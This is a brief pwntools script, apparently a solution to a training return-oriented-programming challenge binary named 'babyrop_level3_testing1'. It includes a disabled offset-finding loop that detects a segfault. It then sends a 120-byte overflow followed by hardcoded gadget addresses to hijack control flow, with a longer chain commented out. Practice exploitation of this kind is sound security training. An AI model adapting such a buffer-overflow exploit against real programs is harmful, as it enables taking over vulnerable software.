import pwn
i = 15
while False:
    i+=1
    p = pwn.process("./babyrop_level3_testing1")
    p.send(b"A"*i)
    p.wait()
    if p.poll()==-11:
        break
distance = 120
print(distance)
p = pwn.process("./babyrop_level3_testing1")
p.send(b"A"*distance+pwn.p64(0x401697)+pwn.p64(0x4016e2))#+b"B"*8+pwn.p64(0x4017ab)+b"B"*8+pwn.p64(0x401848)+b"B"*8+pwn.p64(0x401982)+b"B"*8+pwn.p64(0x4018e5))
print(p.readall())
